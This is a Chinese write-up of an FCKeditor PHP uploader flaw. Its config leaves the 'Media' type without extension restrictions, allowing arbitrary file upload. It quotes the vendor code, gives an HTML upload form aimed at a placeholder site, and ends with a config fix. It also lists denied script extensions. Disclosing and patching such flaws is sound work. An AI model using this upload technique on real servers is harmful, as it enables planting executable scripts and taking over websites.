@@ -1,0 +1,258 @@
+网上公布该漏洞已经很久了，一直也没怎么看，今天给朋友做个站点测试，顺便看了看这个漏洞，就此说几句。
+    1、漏洞描述
+    fckeditor/editor/filemanager/upload/php/upload.php
+
+<?php
+/*
+* FCKeditor - The text editor for Internet - http://www.fckeditor.net
+* Copyright (C) 2003-2007 Frederico Caldeira Knabben
+*
+* == BEGIN LICENSE ==
+*
+* Licensed under the terms of any of the following licenses at your
+* choice:
+*
+* - GNU General Public License Version 2 or later (the "GPL")
+*    http://www.gnu.org/licenses/gpl.html
+*
+* - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
+*    http://www.gnu.org/licenses/lgpl.html
+*
+* - Mozilla Public License Version 1.1 or later (the "MPL")
+*    http://www.mozilla.org/MPL/MPL-1.1.html
+*
+* == END LICENSE ==
+*
+* This is the "File Uploader" for PHP.
+*/
+
+require('config.php') ;
+require('util.php') ;
+
+// This is the function that sends the results of the uploading process.
+function SendResults( $errorNumber, $fileUrl = '', $fileName = '', $customMsg = '' )
+{
+echo '<script type="text/javascript">' ;
+echo 'window.parent.OnUploadCompleted(' . $errorNumber . ',"' . str_replace( '"', '\\"', $fileUrl ) . '","' . str_replace( '"', '\\"', $fileName ) . '", "' . str_replace( '"', '\\"', $customMsg ) . '") ;' ;
+echo '</script>' ;
+exit ;
+}
+
+// Check if this uploader has been enabled.
+if ( !$Config['Enabled'] )
+SendResults( '1', '', '', 'This file uploader is disabled. Please check the "editor/filemanager/upload/php/config.php" file' ) ;
+
+// Check if the file has been correctly uploaded.
+if ( !isset( $_FILES['NewFile'] ) || is_null( $_FILES['NewFile']['tmp_name'] ) || $_FILES['NewFile']['name'] == '' )
+SendResults( '202' ) ;
+
+// Get the posted file.
+$oFile = $_FILES['NewFile'] ;
+
+// Get the uploaded file name extension.
+$sFileName = $oFile['name'] ;
+
+// Replace dots in the name with underscores (only one dot can be there... security issue).
+if ( $Config['ForceSingleExtension'] )
+$sFileName = preg_replace( '/\\.(?![^.]*$)/', '_', $sFileName ) ;
+
+$sOriginalFileName = $sFileName ;
+
+// Get the extension.
+$sExtension = substr( $sFileName, ( strrpos($sFileName, '.') + 1 ) ) ;
+$sExtension = strtolower( $sExtension ) ;
+
+// The the file type (from the QueryString, by default 'File').
+$sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ;
+
+// Check if it is an allowed type.
+if ( !in_array( $sType, array('File','Image','Flash','Media') ) )
+    SendResults( 1, '', '', 'Invalid type specified' ) ;
+
+// Get the allowed and denied extensions arrays.
+$arAllowed = $Config['AllowedExtensions'][$sType] ;
+$arDenied = $Config['DeniedExtensions'][$sType] ;
+
+// Check if it is an allowed extension.
+if ( ( count($arAllowed) > 0 && !in_array( $sExtension, $arAllowed ) ) || ( count($arDenied) > 0 && in_array( $sExtension, $arDenied ) ) )
+SendResults( '202' ) ;
+
+$sErrorNumber = '0' ;
+$sFileUrl   = '' ;
+
+// Initializes the counter used to rename the file, if another one with the same name already exists.
+$iCounter = 0 ;
+
+// Get the target directory.
+if ( isset( $Config['UserFilesAbsolutePath'] ) && strlen( $Config['UserFilesAbsolutePath'] ) > 0 )
+$sServerDir = $Config['UserFilesAbsolutePath'] ;
+else
+$sServerDir = GetRootPath() . $Config["UserFilesPath"] ;
+
+if ( $Config['UseFileType'] )
+$sServerDir .= $sType . '/' ;
+
+while ( true )
+{
+// Compose the file path.
+$sFilePath = $sServerDir . $sFileName ;
+
+// If a file with that name already exists.
+if ( is_file( $sFilePath ) )
+{
+   $iCounter++ ;
+   $sFileName = RemoveExtension( $sOriginalFileName ) . '(' . $iCounter . ').' . $sExtension ;
+   $sErrorNumber = '201' ;
+}
+else
+{
+   move_uploaded_file( $oFile['tmp_name'], $sFilePath ) ;
+
+   if ( is_file( $sFilePath ) )
+   {
+    $oldumask = umask(0) ;
+    chmod( $sFilePath, 0777 ) ;
+    umask( $oldumask ) ;
+   }
+
+   if ( $Config['UseFileType'] )
+    $sFileUrl = $Config["UserFilesPath"] . $sType . '/' . $sFileName ;
+   else
+    $sFileUrl = $Config["UserFilesPath"] . $sFileName ;
+
+   break ;
+}
+}
+
+SendResults( $sErrorNumber, $sFileUrl, $sFileName ) ;
+?>
+    fckeditor/editor/filemanager/upload/php/config.php
+
+<?php
+/*
+* FCKeditor - The text editor for Internet - http://www.fckeditor.net
+* Copyright (C) 2003-2007 Frederico Caldeira Knabben
+*
+* == BEGIN LICENSE ==
+*
+* Licensed under the terms of any of the following licenses at your
+* choice:
+*
+* - GNU General Public License Version 2 or later (the "GPL")
+*    http://www.gnu.org/licenses/gpl.html
+*
+* - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
+*    http://www.gnu.org/licenses/lgpl.html
+*
+* - Mozilla Public License Version 1.1 or later (the "MPL")
+*    http://www.mozilla.org/MPL/MPL-1.1.html
+*
+* == END LICENSE ==
+*
+* Configuration file for the PHP File Uploader.
+*/
+
+global $Config ;
+
+// SECURITY: You must explicitelly enable this "uploader".
+$Config['Enabled'] = false ;
+
+// Set if the file type must be considere in the target path.
+// Ex: /userfiles/image/ or /userfiles/file/
+$Config['UseFileType'] = false ;
+
+// Path to uploaded files relative to the document root.
+$Config['UserFilesPath'] = '/userfiles/' ;
+
+// Fill the following value it you prefer to specify the absolute path for the
+// user files directory. Usefull if you are using a virtual directory, symbolic
+// link or alias. Examples: 'C:\\MySite\\userfiles\\' or '/root/mysite/userfiles/'.
+// Attention: The above 'UserFilesPath' must point to the same directory.
+$Config['UserFilesAbsolutePath'] = '' ;
+
+// Due to security issues with Apache modules, it is reccomended to leave the
+// following setting enabled.
+$Config['ForceSingleExtension'] = true ;
+
+$Config['AllowedExtensions']['File'] = array() ;
+$Config['DeniedExtensions']['File']   = array('html','htm','php','php2','php3','php4','php5','phtml','pwml','inc','asp','aspx','ascx','jsp','cfm','cfc','pl','bat','exe','com','dll','vbs','js','reg','cgi','htaccess','asis') ;
+
+$Config['AllowedExtensions']['Image'] = array('jpg','gif','jpeg','png') ;
+$Config['DeniedExtensions']['Image'] = array() ;
+
+$Config['AllowedExtensions']['Flash'] = array('swf','fla') ;
+$Config['DeniedExtensions']['Flash'] = array() ;
+
+?>
+    问题主要是出在config.php文件中未对Media目录作白名单和黑名单的限制，大概是写漏了，因为在fckeditor/editor/filemanager/browser/default/connectors/php目录中的config.php文件对Media是有限制的。
+
+<?php
+/*
+* FCKeditor - The text editor for Internet - http://www.fckeditor.net
+* Copyright (C) 2003-2007 Frederico Caldeira Knabben
+*
+* == BEGIN LICENSE ==
+*
+* Licensed under the terms of any of the following licenses at your
+* choice:
+*
+* - GNU General Public License Version 2 or later (the "GPL")
+*    http://www.gnu.org/licenses/gpl.html
+*
+* - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
+*    http://www.gnu.org/licenses/lgpl.html
+*
+* - Mozilla Public License Version 1.1 or later (the "MPL")
+*    http://www.mozilla.org/MPL/MPL-1.1.html
+*
+* == END LICENSE ==
+*
+* Configuration file for the File Manager Connector for PHP.
+*/
+
+global $Config ;
+
+// SECURITY: You must explicitelly enable this "connector". (Set it to "true").
+$Config['Enabled'] = false ;
+
+
+// Path to user files relative to the document root.
+$Config['UserFilesPath'] = '/userfiles/' ;
+
+// Fill the following value it you prefer to specify the absolute path for the
+// user files directory. Usefull if you are using a virtual directory, symbolic
+// link or alias. Examples: 'C:\\MySite\\userfiles\\' or '/root/mysite/userfiles/'.
+// Attention: The above 'UserFilesPath' must point to the same directory.
+$Config['UserFilesAbsolutePath'] = '' ;
+
+// Due to security issues with Apache modules, it is reccomended to leave the
+// following setting enabled.
+$Config['ForceSingleExtension'] = true ;
+
+$Config['AllowedExtensions']['File'] = array() ;
+$Config['DeniedExtensions']['File']   = array('html','htm','php','php2','php3','php4','php5','phtml','pwml','inc','asp','aspx','ascx','jsp','cfm','cfc','pl','bat','exe','com','dll','vbs','js','reg','cgi','htaccess','asis') ;
+
+$Config['AllowedExtensions']['Image'] = array('jpg','gif','jpeg','png') ;
+$Config['DeniedExtensions']['Image'] = array() ;
+
+$Config['AllowedExtensions']['Flash'] = array('swf','fla') ;
+$Config['DeniedExtensions']['Flash'] = array() ;
+
+$Config['AllowedExtensions']['Media'] = array('swf','fla','jpg','gif','jpeg','png','avi','mpg','mpeg') ;
+$Config['DeniedExtensions']['Media'] = array() ;
+
+?>
+    2、漏洞利用
+    既然fckeditor/editor /filemanager/browser/default/connectors/php/config.php已经过滤了，那就只能利用 fckeditor/editor/filemanager/upload/php/config.php了。
+    不过如果留意一下改配置文件，就能看到默认情况下“$Config['Enabled'] = false”，是不允许上传的；其次，看upload.php能发现，程序对上传文件夹作了比对，必须是Media，说明在windows下不影响，但在Linux下则必须是大写M的Media目录，如果是media则返回信息正常，但文件并未上传成功。
+    自己写段上传脚本：
+<form id="frmUpload" enctype="multipart/form-data" action="http://www.xxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post">
+Upload a new file:<br>
+<input type="file" name="NewFile" size="50"><br>
+<input id="btnUpload" type="submit" value="Upload">
+</form>
+    提交后查看源码就能看到上传文件的位置。
+    3、漏洞修补
+    最好用新版，要不就拷贝以下代码到config.php最后。
+$Config['AllowedExtensions']['Media'] = array('swf','fla','jpg','gif','jpeg','png','avi','mpg','mpeg') ;
+$Config['DeniedExtensions']['Media'] = array() ;
